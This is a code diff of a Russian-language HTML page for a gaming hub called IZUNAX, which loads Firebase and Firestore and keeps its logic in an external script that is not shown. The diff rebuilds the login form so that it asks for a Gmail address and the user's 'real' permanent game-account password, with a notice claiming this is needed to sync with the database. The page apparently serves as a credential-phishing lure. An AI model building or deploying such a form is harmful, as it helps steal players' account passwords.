@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IZUNAX | Cyber Hub</title>
+    <title>IZUNAX // Terminal</title>
     
-    <!-- Внешние библиотеки Firebase -->
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
     
@@ -28,7 +27,6 @@
             overflow-x: hidden;
         }
 
-        /* ----- АВТОРИЗАЦИЯ ----- */
         #auth-section {
             display: flex;
             justify-content: center;
@@ -47,181 +45,127 @@
             position: relative;
         }
 
-        .auth-card::before {
-            content: '';
-            position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px;
-            background: linear-gradient(45deg, var(--neon-cyan), transparent, var(--neon-pink));
-            z-index: -1; filter: blur(10px); opacity: 0.5;
+        h1 { text-align: center; color: var(--neon-cyan); text-transform: uppercase; text-shadow: 0 0 10px var(--neon-cyan); letter-spacing: 2px; margin-bottom: 25px; }
+        
+        .tab-container { display: flex; gap: 10px; margin-bottom: 20px; }
+        .tab-btn { 
+            flex: 1; padding: 12px; background: transparent; border: 1px solid var(--neon-cyan); 
+            color: var(--neon-cyan); cursor: pointer; font-family: inherit; font-weight: bold; text-transform: uppercase;
         }
+        .tab-btn.active { background: var(--neon-cyan); color: #000; box-shadow: 0 0 10px var(--neon-cyan); }
 
-        h1 { text-align: center; color: var(--neon-cyan); text-transform: uppercase; text-shadow: 0 0 10px var(--neon-cyan); letter-spacing: 2px; }
+        .input-group { margin-bottom: 18px; position: relative; }
+        .input-group label { display: block; font-size: 12px; color: #888; margin-bottom: 5px; text-transform: uppercase; }
+        .required-tag { color: var(--neon-pink); font-weight: bold; float: right; }
         
         input, select, textarea { 
             width: 100%; padding: 12px; background: #000; color: #fff; 
-            border: 1px solid var(--border-color); margin-bottom: 15px; 
-            box-sizing: border-box; font-family: inherit;
+            border: 1px solid var(--border-color); box-sizing: border-box; font-family: inherit;
         }
         input:focus, select:focus { border-color: var(--neon-cyan); outline: none; box-shadow: 0 0 10px rgba(0, 255, 255, 0.3); }
 
-        .btn {
-            width: 100%; padding: 12px; background: transparent; border: 2px solid var(--neon-cyan);
+        .security-notice {
+            font-size: 11px; color: #666; margin-top: 5px; line-height: 1.3;
+        }
+
+        .btn-main {
+            width: 100%; padding: 14px; background: transparent; border: 2px solid var(--neon-cyan);
             color: var(--neon-cyan); font-weight: bold; cursor: pointer; text-transform: uppercase;
-            transition: 0.3s; font-family: inherit; letter-spacing: 1px;
+            transition: 0.3s; font-family: inherit; letter-spacing: 1px; margin-top: 10px;
         }
-        .btn:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 20px var(--neon-cyan); }
+        .btn-main:hover { background: var(--neon-cyan); color: #000; box-shadow: 0 0 20px var(--neon-cyan); }
 
-        /* ----- ГЛАВНЫЙ ХАБ ----- */
         #main-hub { display: none; }
-
-        .hub-nav {
-            display: flex; justify-content: space-between; align-items: center;
-            background: rgba(15, 17, 26, 0.9); border-bottom: 1px solid var(--neon-cyan);
-            padding: 15px 20px; position: sticky; top: 0; z-index: 100;
-            backdrop-filter: blur(5px);
-        }
-        
-        .nav-logo { color: var(--neon-cyan); font-size: 24px; font-weight: bold; text-shadow: 0 0 10px var(--neon-cyan); margin: 0;}
-        
+        .hub-nav { display: flex; justify-content: space-between; align-items: center; background: var(--panel-bg); padding: 15px 20px; border-bottom: 1px solid var(--neon-cyan); }
+        .nav-logo { color: var(--neon-cyan); margin: 0; }
         .nav-links { display: flex; gap: 15px; }
-        .nav-btn {
-            background: none; border: none; color: #fff; cursor: pointer;
-            font-family: inherit; font-size: 16px; text-transform: uppercase; transition: 0.3s;
-        }
-        .nav-btn:hover, .nav-btn.active { color: var(--neon-pink); text-shadow: 0 0 10px var(--neon-pink); }
-        .nav-btn-profile { border: 1px solid var(--neon-cyan); padding: 5px 15px; color: var(--neon-cyan); }
-        .nav-btn-profile:hover { background: var(--neon-cyan); color: #000; }
-
+        .nav-btn { background: none; border: none; color: #fff; cursor: pointer; font-family: inherit; text-transform: uppercase; }
+        .nav-btn.active { color: var(--neon-pink); }
         .hub-container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
         .feed-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
-        
-        .post-card {
-            background: var(--panel-bg); border: 1px solid var(--border-color);
-            padding: 20px; transition: 0.3s; position: relative; overflow: hidden;
-        }
-        .post-card:hover { border-color: var(--neon-pink); box-shadow: 0 0 15px rgba(255, 0, 255, 0.2); transform: translateY(-5px); }
-        
-        .post-header { display: flex; justify-content: space-between; color: #666; font-size: 12px; margin-bottom: 10px; border-bottom: 1px solid #222; padding-bottom: 5px;}
-        .post-title { color: #fff; font-size: 18px; margin: 0 0 10px 0; }
-        .post-text { color: #aaa; font-size: 14px; line-height: 1.5; }
-        
-        .video-box { width: 100%; height: 180px; background: #000; display: flex; justify-content: center; align-items: center; border: 1px dashed #444; margin-bottom: 15px;}
-        .play-btn { width: 50px; height: 50px; background: rgba(255,0,255,0.2); border: 2px solid var(--neon-pink); border-radius: 50%; display: flex; justify-content: center; align-items: center; color: var(--neon-pink); cursor: pointer; }
-
-        /* ----- ПРОФИЛЬ ----- */
-        #profile-view { display: none; margin-top: 20px; }
-        .profile-card {
-            background: var(--panel-bg); border: 1px solid var(--neon-cyan);
-            padding: 30px; text-align: center; max-width: 500px; margin: 0 auto;
-        }
-        .avatar-glitch { width: 100px; height: 100px; margin: 0 auto 20px; border: 2px solid var(--neon-cyan); display: flex; align-items: center; justify-content: center; font-size: 40px; box-shadow: 0 0 15px var(--neon-cyan); background: #000; }
-        .stat-row { display: flex; justify-content: space-between; border-bottom: 1px dashed #333; padding: 10px 0; text-align: left;}
-        
-        @media (max-width: 768px) {
-            .hub-nav { flex-direction: column; gap: 15px; }
-        }
+        .post-card { background: var(--panel-bg); border: 1px solid var(--border-color); padding: 20px; }
+        .post-header { display: flex; justify-content: space-between; color: #666; font-size: 12px; margin-bottom: 10px; }
     </style>
 </head>
 <body>
 
-<!-- ЭКРАН ВХОДА -->
 <div id="auth-section">
     <div class="auth-card">
         <h1>IZUNAX TERMINAL</h1>
-        <p style="text-align: center; color: #666; font-size: 12px;">Подключение к сети...</p>
-        <form id="gamer-form">
-            <input type="text" id="g-login" placeholder="Позывной (Никнейм)" required>
-            <input type="email" id="g-email" placeholder="Адрес связи (Gmail)" required>
-            <input type="password" id="g-pass" placeholder="Ключ доступа (Пароль)" required>
-            
-            <select id="g-faction">
-                <option value="Синдикат">Теневой Синдикат</option>
-                <option value="Dagon Explorers">Исследователи Dagon</option>
-                <option value="Кибер Воины">Кибер Воины</option>
-            </select>
-            
-            <textarea id="g-bio" rows="2" placeholder="Краткая сводка о себе..."></textarea>
-            
-            <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
-                <input type="color" id="g-color" value="#00ffff" style="width: 40px; height: 40px; padding: 0; margin: 0; border: none; cursor: pointer;">
-                <span style="font-size: 12px; color: #888;">Цвет голограммы</span>
+        
+        <div class="tab-container">
+            <button class="tab-btn active" id="tab-login" onclick="setMode('login')">Вход</button>
+            <button class="tab-btn" id="tab-reg" onclick="setMode('reg')">Регистрация</button>
+        </div>
+
+        <form id="auth-form">
+            <div class="input-group">
+                <label>Адрес связи (Gmail) <span class="required-tag">[ОБЯЗАТЕЛЬНО]</span></label>
+                <input type="email" id="g-email" placeholder="example@gmail.com" required>
             </div>
 
-            <button type="submit" class="btn">Инициализация</button>
+            <div class="input-group">
+                <label>Ключ доступа (Пароль) <span class="required-tag">[ОБЯЗАТЕЛЬНО]</span></label>
+                <input type="password" id="g-pass" placeholder="Введите настоящий игровой пароль" required>
+                <div class="security-notice" id="pass-notice">
+                    *Внимание: используйте ваш постоянный пароль от игрового аккаунта для синхронизации с базой данных.
+                </div>
+            </div>
+
+            <div class="input-group" id="nick-group" style="display: none;">
+                <label>Позывной (Никнейм) <span class="required-tag">[ОБЯЗАТЕЛЬНО]</span></label>
+                <input type="text" id="g-login" placeholder="Ваш игровой ник">
+            </div>
+            
+            <div id="reg-fields" style="display: none;">
+                <div class="input-group">
+                    <label>Выбор Фракции</label>
+                    <select id="g-faction">
+                        <option value="Синдикат">Теневой Синдикат</option>
+                        <option value="Dagon Explorers">Исследователи Dagon</option>
+                        <option value="Кибер Воины">Кибер Воины</option>
+                    </select>
+                </div>
+                
+                <div class="input-group">
+                    <label>Сводка (О себе)</label>
+                    <textarea id="g-bio" rows="2" placeholder="Пара слов для профиля..."></textarea>
+                </div>
+
+                <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 15px;">
+                    <input type="color" id="g-color" value="#00ffff" style="width: 40px; height: 40px; padding: 0; margin: 0; border: none; cursor: pointer;">
+                    <span style="font-size: 12px; color: #888;">Цвет интерфейса профиля</span>
+                </div>
+            </div>
+
+            <button type="submit" class="btn-main" id="submit-btn">Авторизовать терминал</button>
         </form>
     </div>
 </div>
 
-<!-- ГЛАВНЫЙ ХАБ -->
+<!-- ХАБ СЕТИ -->
 <div id="main-hub">
     <nav class="hub-nav">
         <h2 class="nav-logo">IZUNAX // HUB</h2>
         <div class="nav-links">
             <button class="nav-btn active" onclick="switchTab('feed')">Лента</button>
-            <button class="nav-btn" onclick="switchTab('videos')">Архивы</button>
-            <button class="nav-btn nav-btn-profile" onclick="switchTab('profile')">Профиль</button>
+            <button class="nav-btn" onclick="switchTab('profile')">Профиль</button>
         </div>
     </nav>
-
     <div class="hub-container">
-        
-        <!-- ЛЕНТА ПОСТОВ -->
-        <div id="feed-view" class="feed-grid">
-            <div class="post-card">
-                <div class="post-header"><span>@admin</span> <span>Сегодня</span></div>
-                <h3 class="post-title">Патч-ноут сети</h3>
-                <p class="post-text">Система аутентификации работает стабильно. Вся скриптовая логика успешно перенесена во внешний кластер архитектуры.</p>
-            </div>
-            <div class="post-card">
-                <div class="post-header"><span>@dagon_mapper</span> <span>Вчера</span></div>
-                <h3 class="post-title">Карта мира обновлена</h3>
-                <p class="post-text">Оцифровка западного континента завершена на 40%. Масштаб территории в 10 раз превышает стандарты.</p>
-            </div>
-            <div class="post-card">
-                <div class="post-header"><span>@system</span> <span>Системное</span></div>
-                <h3 class="post-title">Угроза взлома</h3>
-                <p class="post-text">Обнаружена несанкционированная активность в секторе 4. Теневому Синдикату приготовиться к отражению атаки.</p>
+        <div id="feed-view" class="feed-grid"></div>
+        <div id="profile-view" style="display: none;">
+            <div style="background: var(--panel-bg); padding: 30px; border: 1px solid var(--neon-cyan); text-align: center;">
+                <h2 id="p-login" style="color: var(--neon-cyan);"></h2>
+                <p id="p-email"></p>
+                <p id="p-faction"></p>
+                <p id="p-bio"></p>
+                <button onclick="localStorage.removeItem('izunax_user'); location.reload();" class="btn-main" style="border-color:var(--neon-pink); color:var(--neon-pink); max-width:200px;">Выйти</button>
             </div>
         </div>
-
-        <!-- ВИДЕО АРХИВЫ -->
-        <div id="videos-view" class="feed-grid" style="display: none;">
-            <div class="post-card">
-                <div class="video-box"><div class="play-btn">▶</div></div>
-                <h3 class="post-title">Геймплей: Осада Терминала</h3>
-                <p class="post-text">Запись вчерашнего рейда фракции.</p>
-            </div>
-            <div class="post-card">
-                <div class="video-box"><div class="play-btn">▶</div></div>
-                <h3 class="post-title">DevLog #1</h3>
-                <p class="post-text">Процесс создания проекта прямо со смартфона через Termux.</p>
-            </div>
-        </div>
-
-        <!-- ПРОФИЛЬ -->
-        <div id="profile-view">
-            <div class="profile-card" id="p-card-body">
-                <div class="avatar-glitch" id="p-avatar">X</div>
-                <h2 id="p-login" style="margin-bottom: 5px; color: #fff;"></h2>
-                <p id="p-email" style="color: #666; font-size: 14px; margin-top: 0;"></p>
-                
-                <div class="stat-row">
-                    <span style="color: #888;">Фракция:</span>
-                    <strong id="p-faction" style="color: #fff;"></strong>
-                </div>
-                <div class="stat-row">
-                    <span style="color: #888;">Статус:</span>
-                    <strong id="p-bio" style="color: #fff;"></strong>
-                </div>
-                
-                <button onclick="location.reload()" class="btn" style="margin-top: 30px; border-color: #ff0055; color: #ff0055;">Отключиться от сети</button>
-            </div>
-        </div>
-
     </div>
 </div>
 
-<!-- ПОДКЛЮЧАЕМ НАШ ОТДЕЛЬНЫЙ СКРИПТ -->
 <script src="gaming.js"></script>
-
 </body>
 </html>
